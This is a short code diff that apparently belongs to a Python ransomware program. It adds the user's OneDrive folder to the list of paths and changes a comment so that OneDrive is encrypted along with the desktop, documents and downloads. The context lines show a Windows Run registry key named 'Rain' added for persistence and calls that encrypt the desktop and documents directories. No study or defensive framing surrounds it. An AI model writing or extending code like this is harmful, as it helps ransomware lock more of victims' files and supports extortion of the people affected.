@@ -14,6 +14,7 @@ from shutil import copyfile
     desktop : path to the user's desktop (if there is)
     documents : path to the user documents (if there is)
     downloads : path to the user downloads (if there is)
+    onedrive : path to the user onedrive (if there is)
     appdata : path to the user's AppData
 """
 
@@ -370,7 +371,7 @@ except PermissionError:
 
 crypto.registry_key(r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', '"' + dst + '"', 'Rain')
 
-# Encrypt user's desktop, documents, downloads and change the desktop background
+# Encrypt user's desktop, documents, downloads, onedrive and change the desktop background
 
 crypto.crypt_directory(desktop)
 crypto.crypt_directory(documents)
